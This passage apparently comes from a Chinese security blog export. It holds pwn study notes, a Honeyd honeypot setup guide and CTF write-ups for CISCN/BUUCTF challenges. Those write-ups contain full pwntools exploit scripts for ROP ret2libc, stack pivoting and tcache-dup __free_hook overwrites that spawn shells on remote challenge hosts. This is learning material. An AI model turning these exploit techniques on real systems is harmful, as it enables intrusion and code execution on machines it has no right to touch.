\n\n▲printf函数的格式化字符串常见有\n\n(1)%d，%f，%c，%s，（用于读取内存数据）\n\n(2)%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）\n\n(3)除了%n，%hn，%hhn，%lln，分别对应写入目标空间4字节，2字节，1字节，8字节。\n\n▲由于使用%n之类的控制字符，输入的str(addr)为以字符串形式输入，也就是说会转换成十进制然后转换成对应的ascii码来存储在栈上，所以不会出现0x00这类的字符。但是如果是需要写入的地址，使用的是p64或者p32，这个就是直接对应的，如果这个地址中有00，那么就不会被read函数读取进入。因为read函数默认结尾是0x00，也就是字符串结束符号。所以这种情况下一般都是将p64(addr)放在payload的末尾，从而自动生成00，不会导致被截断。\n\n \n\n★技巧总结:\n\n1.劫持某函数为system函数时，是将Got表劫持为plt表，并且该函数的总体结构应该与system函数类似，参数应该是一个地址。\n\n2.fmtstr模块的用法需要注意，有时候也不太好用。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"暑期总结","url":"/2021/08/14/暑期总结/","content":"\n小学期一直在忙小程序的设计，现在放上来吧，也最后做个总结：\n\n一、Libcap的使用：\n\n1.头文件环境相关：\n\n用的是ubuntu18.04的环境\n\n(1)头文件及环境配置：\n\n```c\n//注释头\n\n\n#include <pcap.h>\n\n//cmd Programmer need\n-lpcap\n\n//QT pro need\nLIBS += -L/usr/local/lib -lpcap\n```\n\n同时需要root权限，QT可以设置\n\n(2)QThread使用\n\n```c\n//注释头\n\nclass libcapThread : public QThread\n{\n    Q_OBJECT\npublic:\n    //overwrite\n    void run();\n\n\nsignals:\n    void signalpcap(QString,QString,QString,\n        QString,QString,const u_char*);\n};\n//注释头\n\nthreadObj->start();\nthreadObj->terminate();\n```\n\n2.抓包流程：\n\n(1)搜索网卡dev：\n\ndev = pcap_lookupdev(errbuf);\n\n这个只能搜索到第一个可用网卡，有的装了docker啥的会存在多个网卡，需要用其他函数。\n\n(2)编译抓取规则：\n\npcap_compile(devHandle, &filter, \"tcp\", 0, deviceMask);\n\n(3)设置抓取规则：\n\npcap_setfilter(devHandle, &filter);\n\n(4)抓包：\n\npcap_loop(devHandle, 1, baseAnalyze, NULL);\n\n▲大概就是这样，然后这里一般需要用到回调函数baseAnalyze()来处理包数据，回调函数可自行得到的参数如下：\n\nvoid baseAnalyze(u_char* user, const struct pcap_pkthdr* pHeader, const u_char* pPktdata)\n\n3.然后就是正常处理显示了，直接贴程序:\n\nhttps://github.com/PIG-007/Programmer/tree/master/Libcap\n\n \n\n二、加解密双机的使用：\n\n▲做了双机的服务器端和DES，AES，还有几个古典，其他的是同学做的，特此说明一下。\n\n1.Socket\n\n(1)创建对象：\n\n```c\n//注释头\n\nserver = new QTcpServer(this);\n```\n\n(2)开始监听：\n\n```c\n//注释头\n\nconnect(ui->btnListen,&QPushButton::clicked,[this]{\n    //if Listening,close it\n    if(server->isListening()){\n    //server->close();\n    closeServer();//Define function\n    //Recover the status after closed\n    }else{\n        const QString address_text=ui->editAddress->text();\n        const QHostAddress address=(address_text==\"Any\")\n            ?QHostAddress::Any\n            :QHostAddress(address_text);\n        const unsigned short port=ui->editPort->text().toUShort();\n        if(server->listen(address,port)){\n        //handle function\n        }else{\n            //error function\n        }\n    }\n}\n```\n\n(3)检测到连接，开始处理：\n\n```c\n//注释头\n\nconnect(server,&QTcpServer::newConnection,this,[this]{\nwhile(server->hasPendingConnections())\n{\n    //nextPendingConnection get the next obj\n    QTcpSocket *socket=server->nextPendingConnection();\n    clientList.append(socket);\n    ui->textRecv->append(QString(\"(%1:%2) Soket Connected\")\n        .arg(socket->peerAddress().toString())\n        .arg(socket->peerPort()));\n        ui->textRecv->append(recv_text);\n});\n```\n\n(4)错误信息处理：\n\n```c\n//注释头\n\nconnect(socket, static_cast<void(QAbstractSocket::*)(QAbstractSocket::SocketError)>(&QAbstractSocket::error),\n[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n//注释头\n\nconnect(socket,&QAbstractSocket::errorOccurred,[this,socket](QAbstractSocket::SocketError)\n{\n//Handle\n});\n```\n\n2.界面设计的不同style:\n\n```c\n//注释头\n\nqApp->setStyle(QStyleFactory::create(\"fusion\"));\n```\n\n3.加密模块：\n\n很多内容就放github上，不再赘述\n\nhttps://github.com/PIG-007/Programmer/tree/master/SocketEncrypt\n\n \n\n","tags":["学习"],"categories":["学习"]},{"title":"蜜罐搭建","url":"/2021/08/14/蜜罐搭建/","content":"\n环境：虚拟机ubuntu18.04。\n\n1.安装前置依赖：\n\n```\nsudo apt-get install g++ gcc\nsudo apt-get install flex\nsudo apt-get install bison\nsudo apt-get install libedit-dev\n```\n\n2.下载前置工具：\n\n```\n#注释头\nlibevent-1.4.14b-stable.tar.gz   \nlibdnet-1.11.tar.gz              \nlibpcap-1.1.1.tar.gz             \narpd-0.2.tar.gz\n#注释头\n\nhttp://libevent.org/\nhttp://libdnet.sourceforge.net/\nhttp://www.tcpdump.org/release/\nhttp://www.citi.umich.edu/u/provos/honeyd\n```\n\n3.安装工具：基本都是编译三部曲\n\n(1)安装Libevent(非同步事件通知的函数库)：使用libevent，可以设定某些事件发生时所执行的函数，用来代替程序所使用的循环检查。\n\n```\n#注释头\n\nsudo tar -zxvf libevent-1.4.14b-stable.tar.gz\ncd libevent-1.4.14b-stable\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(2)安装Libdnet(提供跨平台的网络相关的API函数库)：包括了ARP缓存，路由表查询，IP包及物理帧的传输等。\n\n```\n#注释头\n\nsudo tar -zxvf libdnet-1.11.tar.gz\ncd libdnet-1.11\nsudo ./configure\nsudo make\nsudo make install\n```\n\n(3)安装Libpcap：一个数据包捕获函数库，大多数网络软件都以它为基础\n\n```\n#注释头\n\nsudo tar -zxvf libpcap-1.1.1.tar.gz\ncd libpcap-1.1.1\nsudo ./configure\nsudo make\nsudo make install\n```\n\n之前装的依赖 flex bison就是为了这个。\n\n(4)安装ARPD（运行在与Honeyd相同的系统上）：arpd是honeyd众多协作工具中最重要的一个工具。工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中arpd可以指定IP地址，将该系统下的MAC地址伪装成指定IP的MAC地址，这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机，然后对蜜罐主机进行相关的设置，就可以诱导攻击，截取流量。\n\n```\n#注释头\n\nsudo tar -zxvf arpd-0.2.tar.gz\ncd arpd-0.2\nsudo ./configure\n#报错：error：expected’)’ before string constant\n#解决：在arpd.c文件中添加#define __FUNCTION__ \"\" #vim arpd.c添加定义\nsudo make\nsudo make install\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452748.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452811.png)\n\n4.安装蜜罐工具Honeyd：\n\n```\n#注释头\n\nsudo tar -zxvf honeyd-1.5c.tar.gz\ncd honeyd-1.5c\nsudo ./configure\n#报错：configure: error: Couldn't figure out how to access libc\n#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so\nsudo make\nsudo make install\n```\n\n5.先将arpd运行起来：\n\n(1)运行后显示链接不存在：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452140.png)\n\n(2)解决办法：找到libevent-1.4.so.2的位置，然后将位置加到定位的文件中\n\nwhereis libevent-1.4.so.2\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452134.png)\n\nsudo vim /etc/ld.so.conf\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452265.png)\n\nsudo ldconfig #重新加载链接\n\n(3)之后选定网卡，即可模拟IP，伪装IP的MAC地址\n\nsudo arpd -i ens33 192.168.1.71\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452193.png)\n\n▲这里的ens33是ubuntu下用ip addr查到的，不同系统可能不同。\n\n6.检测Honeyd是否可以运行：\n\n(1)设置启动参数vim honeyd.conf：\n\n```\n#注释头\n\n# Example of a simple host template and its binding\ncreate windows\n\n#创建一个windows xp系统的蜜罐\nset windows personality \"Microsoft Windows XP Professional SP1\"\n\n#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh\nadd windows tcp port 80 \"sh /home/hacker/Desktop/Web/Honey/honeyd-    1.5c/scripts/web.sh\"\n\n#关闭默认的tcp,udp连接\nset windows default tcp action reset\nset windows default udp action reset\n\n#将windows这个蜜罐的ip绑定为192.168.40.150\nbind 192.168.40.150 windows\n```\n\n▲注意这里面设置的IP是在局域网下的，且还没有被DHCP分配出去的可用IP。同时设置了该IP主机下的80端口，这样其他用户在访问该IP的80端口时就会运行(Web访问)\n\nsh /home/hacker/Desktop/Web/Honey/honeyd- 1.5c/scripts/web.sh\n\n这条命令，然后返回相应的信息。\n\n(2)设置web.sh脚本(这可以随便设置，制作一个web前端即可，常用来钓鱼)，在honeyd.conf中设置路径：在scripts下原本存在一个自带的脚本，该脚本被其他人访问运行成功后呈现如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191452534.png)\n\n(3)启动蜜罐honeyd：\n\nhoneyd -d -f honeyd.conf 192.168.1.2\n\n▲这样一个蜜罐就搭建起来了，需要注意的是搭建步骤大概分为以下几步：\n\n①利用arpd虚拟IP。\n\n②在honey的启动参数中，也就是honey.conf中绑定虚拟的主机到虚拟IP。\n\n③在honey.conf中设置虚拟主机的相关端口，协议等参数。\n\n④设置端口连接后的返回信息，类似于80端口的web.sh，或者ssh连接端口的页面等等。\n\n⑤启动honey，等待鱼儿上钩。\n\n \n\n参考资料：\n\nhttps://www.dazhuanlan.com/2019/12/17/5df842503e7a9/\n\nhttps://blog.csdn.net/accepthjp/article/details/46399715\n\nhttps://blog.csdn.net/zhangxuechao_/article/details/80261502\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"调试常用骚操作","url":"/2021/08/14/调试常用骚操作/","content":"\n## 1.查看数据\n\n- 查看可能用到的变量或函数地址：`magic`\n\n- 查看指定地方地址或值：\n\n  ```\n  #注释头\n  \n  p &__malloc_hook\n  p *__malloc_hook\n  p __malloc_hook\n  p main_arena.bins[0]\n  p main_arena.fastbinsY\n  ```\n\n- 查看堆状态内容：\n\n  ```\n  heap; vis; parseheap; bins;\n  ```\n\n- 查看函数汇编代码：`x/20i &__libc_realloc`\n\n- 查看调用的函数：`backtrace`，可以查看到当前位置调用的相关堆栈及函数\n\n\n\n## 2.技巧\n\n- 直接从Libc.so中查找函数：\n\n  ```\n  readelf -s /lib/x86_64-linux-gnu/libc-2.23.so | grep -E \"__malloc_hook|__free_hook|__realloc_hook\"\n  ```\n\n- 结构体的size\n\n  ```\n  p sizeof((*(struct msg_queue*)0xffffffff82203e90))\n  ```\n\n- libs：类似IDA中的ctrl+s\n\n\n\n## 3.断点\n\n- 硬件断点：`watch/awatch/rwatch *addr`内存硬件断点，分别对应写/读写/读。\n\n\n\n## 4.多线程\n\n- 查看线程：`i threads`\n\n  ![image-20220425194911990](https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220425194911990.png)\n\n- 切换线程：`thread x`，这个x就比如是上述3个线程中的某个线程。`pwndbg`中可以完美切换，并且堆方面也可以。\n\n\n\n\n\n\n\n# gef\n\n```\ndecompiler connect ida --host 192.168.xxx.xxx(LAN IP) --port 3662\nsearch-pattern\nheap bins\nheap chunks\nheap chunk\n```\n\n","tags":["调试"],"categories":["PWN"]},{"title":"通过栈溢出获取libc地址汇总","url":"/2021/08/14/通过栈溢出获取libc地址汇总/","content":"\n# 一、使用LibcSearch\n\n \n\n# 二、使用DynELF来泄露：\n\n## 1.使用write函数\n\n三个参数布局\n\n★32位程序：直接在栈上给出参数\n\n直接让write返回到start函数初始化程序(多用于栈溢出字节数较少)\n\n```\n#注释头\n\ndef leak(addr):\n#io.recv(),看具体情况是否要先接收\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #调用write\n    payload += p32(start_addr) #write返回到start，恢复栈\n    payload += p32(1) #write第一个参数fd\n    payload += p32(addr) #write第二个参数buf\n    payload += p32(8) #write第三个参数size\n    io.sendline(payload)\n    data = io.recv()[:8] #接受内容读取通过write打印的地址\n    print(\"%#x -> %s\" %(addr, (data or '').encode('hex')))\n    #这里打印不需要也可以，只是可以打印出来让我们看到write打印了什么地 址，基本都打印了\n    return data\n    #这里return的data有很多地址，需要通过之后的DynELF来lookup对应的 地址\n```\n\n★64位程序：利用万能gadget来赋予参数：\n\n```\n#注释头\n\ndef leak(addr):\n    #print p.recv()，看具体情况是否要先接收\n    payload = \"A\" * 24\n    payload += p64(pop6_addr) #万能gadget1\n    payload += p64(0)\n    payload += p64(1)\n    payload += p64(write_got_addr) #注意这里不能用plt表\n    payload += p64(8)\n    payload += p64(addr)\n    payload += p64(1)#write的参数fd，1代表stdout标准输出\n    payload += p64(mov_call_addr) #万能gadget2\n    payload += \"A\" * 56\n    #padding过掉万能gadget2的判断语句，接上万能gadget1，用来填充栈\n    payload += p64(startAddress)#跳转start，恢复栈\n    p.send(payload)\n    data = p.recv(4)\n    print (\"%#x => %s\" % (address, (data or '').encode('hex'))\n    return data\n```\n\n## 2.使用put函数：\n\n一个参数布局\n\nputs函数比较好调用，32位下直接在栈上布局就好，64位下用一个pop rdi就完事。\n\nputs的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\\x00截断符，输出就会终止，且会自动将\"\\n\"追加到输出字符串的末尾，所以这里就需要针对leak函数做特殊处理。但结束不太好判断，如果只用\\n来判断，那么如果需要泄露的地址最后两个字节中的有效位中带有\\n(0x0a)，那同样会截断，导致无法完全输出。所以这里用\\n和timeout来判断，当结束字符\\n出现，并且设置超时机制，出现结束字符并且没有东西再输出了，那就代表是真的结束了。由于是一个字节一个字节处理，所以如果puts函数输出完后还有其它的输出，那么就没办法知道0x0a到底是put输出的还是之后的输出函数输出的，这里主要讨论在这两种情况：\n\n(这里也是因为TCP握手原因，TCP传输是以字节为单位进行编码传输的)\n\n★puts输出完后没有其它输出：\n\n```\n#注释头\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #一定要在puts前释放完输出\n    up = \"\"\n    while True:\n    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到    了，就说明输出结束了\n    #这里为了不与标志字符串结束的回车符（0x0A）混淆，所以有两个判断条件。这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””\n        c = p.recv(numb=1, timeout=0.1)\n        count += 1\n        if up == '\\n' and c == \"\":  \n        #接收到的上一个字符为回车符，而当前接收不到新字符，则\n           buf = buf[:-1] #删除puts函数输出的末尾回车符\n           buf += \"x00\"\n           break\n        else:\n           buf += c\n           up = c\n    data = buf[:4]  #取指定字节数\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\n★puts输出完后还有其它输出：\n\n```\n#注释头\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #一定要在puts前释放完输出\n    up = \"\"\n    while True:\n    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了\n    #不与标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””\n    c = p.recv(numb=1, timeout=1)\n    count += 1\n    if up == 'n' and c == \"X\":  \n    #接收到的上一个字符为回车符，下一个字符开头是X，那就结束输出。\n        buf = buf[:-1]             #删除puts函数输出的末尾回车符\n        buf += \"x00\"\n        break\n    else:\n        buf += c\n        up = c\n    data = buf[:4]  #从put输出开头取指定字节数\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\n▲使用printf函数：没找到具体点的，但应该和puts函数差不多，以后遇到再说。已知：\n\n遇到\\x00和\\x0a会截断，然后打印的时候不会打印\\x00和\\x0a\n\n \n\n# 三、重要注意事项：\n\n注意程序的输入函数是什么，有些题的输入函数是scanf，那么就不支持读入空格，换行符，制表符，转换成ascii码就是：0x20，0x0a，0x09，0x00,所以当传数据的时候有这些的时候需要注意。更多查资料或者调试。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.anquanke.com/post/id/85129\n\n \n\n \n","tags":["pwn-knowledge"],"categories":["PWN"]},{"title":"CISCN-BUU刷题记录1","url":"/2021/08/14/CISCN-BUU刷题记录1/","content":"\n1.ciscn_2019_c_1：栈溢出，调用打印函数泄露地址，万能gadget，ROP。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_c_1\"\n#libc.so = \"./libc-2.24.so\"\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nrl = lambda :io.recvline()\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28337\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmenu = \"choice!\\n\"\npop_rdi=0x400c83\nret=0x4006b9\nmain=elf.sym['main']\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nencrypt_addr = 0x4009A0\n\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\nlog.info(\"u_gadget1:0x%x\"%u_gadget1)\nlog.info(\"u_gadget2:0x%x\"%u_gadget2)\n\npayload = \"\"\npayload += \"\\x00\"\npayload = payload.ljust(0x58,'A')\npayload += p64(u_gadget1) #使用万能gadgets调用puts泄露地址\npayload += p64(0x0)\npayload += p64(0x1) #rbp，随便设置\npayload += p64(puts_got)\npayload += p64(0x8)\npayload += p64(puts_got) #从该got表泄露地址\npayload += p64(puts_got)\npayload += p64(u_gadget2)\npayload += 'A'*0x38 #栈修正\npayload += p64(encrypt_addr)\n#返回到function处，通常返回程序最开始来重新运行程序好再进行布置\n\n#payload='\\0'+'a'*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\n\nru(menu)\nsl('1')\nsl(payload)\nru('Ciphertext\\n')\nru('\\n')\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts:0x%x\"%u_gadget2)\n\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\npayload='\\x00'+'a'*(0x50-1+8)+ p64(ret) + p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)\n\nsl(payload)\np.interactive()\n```\n\n2.ciscn_2019_es_2：32位栈溢出，溢出长度不够。泄露栈地址，用ebp将栈迁移到上层函数的栈中，利用上层函数余下的汇编代码实现常规的栈溢出操作system+binsh来getshell：\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_es_2\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28784\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsystem_plt = elf.plt['system']\n\nru(\"name?\\n\")\npayload1 = \"\"\npayload1 += \"A\"*(0x24)+\"B\"*0x4\np.send(payload1)\nru(\"BBBB\")\nstack_addr = u32(rc(4))\nebp_addr = stack_addr-0x10\nlog.info(\"ebp_addr:0x%x\"%ebp_addr)\n\npayload2 = p32(ebp_addr-0x28+0x8) #0\n#payload2 += p32(ebp_addr-0x40)\npayload2 += p32(system_plt) #4\npayload2 += p32(0x11111111) #padding\npayload2 += p32(ebp_addr-0x28 + 20) #8 binsh_addr\npayload2 += p32(ebp_addr) #12\npayload2 += \"/bin/sh\\x00\" #16\npayload2 = payload2.ljust(0x28,\"A\")\npayload2 += p32(ebp_addr-0x24) #old ebp\npause()\np.send(payload2)\n\n\np.interactive()\n```\n\n3.ciscn_2019_final_3：free之后指针未置空，且该2..27版的tcache存在dup漏洞。利用程序泄露堆地址，再利用dup控tcache结构体。修改一个Chunk的size域或者直接Free掉程序最开始自带的一个chunk，使其进入unsortedbin。然后在控tcache，再利用add函数泄露libc地址，改free_hook为system，free(binsh)一步getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_3\"\nlibc_file= \"./libc.so.6\"\n#libc.so = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    #elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25451\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice > \"\n\n\ndef add(idx, size, context):\n    sla(menu, \"1\")\n    sla(\"input the index\\n\", str(idx))\n    sla(\"input the size\\n\", str(size))\n    sa(\"now you can write something\\n\", context)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"input the index\\n\", str(idx))\n\n# def show(idx):\n# sla(menu, \"3\")\n# sla(\"input index:\", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\nbarray = 0x11c10\n\nadd(0,0x18,\"A\"*0x18)\n\nru(\"gift :\")\nchunk0_addr = int(rc(14)[2:14],16)-0x10\nheap_base = chunk0_addr - 0x11e60\nbarry_addr = heap_base+0x2d0\nlog.info(\"heap_base:0x%x\"%heap_base)\ndelete(0)\n\nadd(1,0x28,\"A\"*0x8) #1\ndelete(1) #tcache(0x78):1\ndelete(1) #tcache(0x78):1->1\n\nadd(2,0x28,p64(chunk0_addr-0x11c10+0x10)) #tcache(0x78):1->barry\nadd(3,0x28,\"A\") #tcache(0x78):barry\nadd(4,0x28,\"barry\")\ndelete(4)\n\n\nadd(5,0x78,\"B\"*0x8) #5\ndelete(5) #tcache(0x78):5\ndelete(5) #tcache(0x78):5->5\nadd(6,0x78,p64(heap_base+0x10)) #tcache(0x78):5->heap_base+0x10\nadd(7,0x78,\"B\"*0x8) #tcache(0x78):heap_base+0x10\n\nadd(8,0x78,\"\\x07\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\nadd(9,0x38,\"\\x78\")\npause()\nadd(10,0x38,\"\\xb0\")\nru(\"gift :\")\nlibc_base = int(rc(14)[2:14],16) - 0x3ebc40 - 88 -8\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"free_hook:0x%x\"%free_hook)\n\nadd(11,0x78,\"\\x01\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\npause()\nadd(12,0x18,p64(system_addr))\nadd(13,0x58,\"/bin/sh\\x00\")\npause()\ndelete(13)\npause()\np.interactive()\n```\n\n4.ciscn_2019_n_3：没啥漏洞，就是程序本身问题，str为结构体型chunk，int为正常chunk，且chunk中存在函数指针，可以通过一定堆布局修改函数指针，改成system再加bash即可getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_n_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25896\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"CNote > \"\n\n\ndef add(idx, Type, length, value):\nsla(menu, \"1\")\nsla(\"Index > \", str(idx))\nsla(\"Type > \", str(Type))\nif Type == 1:\nsla(\"Value > \", value)\nif Type == 2:\nsla(\"Length > \", str(length))\nsla(\"Value > \", value)\n\ndef delete(idx):\nsla(menu, \"2\")\nsla(\"Index > \", str(idx))\n\ndef 